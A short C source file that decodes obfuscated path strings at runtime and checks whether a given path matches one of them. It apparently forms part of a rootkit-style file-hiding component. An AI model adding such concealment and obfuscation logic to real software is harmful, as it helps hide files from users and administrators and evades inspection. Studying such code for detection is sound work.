#include "paths.h"
#include "obf.h"
#include <stdlib.h>

char *g_dec_paths[sizeof(kHiddenBlobs)/sizeof(kHiddenBlobs[0])] = {0};
bool  g_paths_ready = false;

void paths_init(void) {
    if (g_paths_ready) return;
    for (size_t i = 0; i < sizeof(kHiddenBlobs)/sizeof(kHiddenBlobs[0]); i++)
        g_dec_paths[i] = obf_runtime_decode(kHiddenBlobs[i].b, kHiddenBlobs[i].l, kHiddenBlobs[i].k);
    g_paths_ready = true;
}

bool path_is_hidden(const char *p) {
    if (!p || !g_paths_ready) return false;
    for (size_t i = 0; i < sizeof(kHiddenBlobs)/sizeof(kHiddenBlobs[0]); i++)
        if (g_dec_paths[i] && strstr(p, g_dec_paths[i])) return true;
    return false;
}
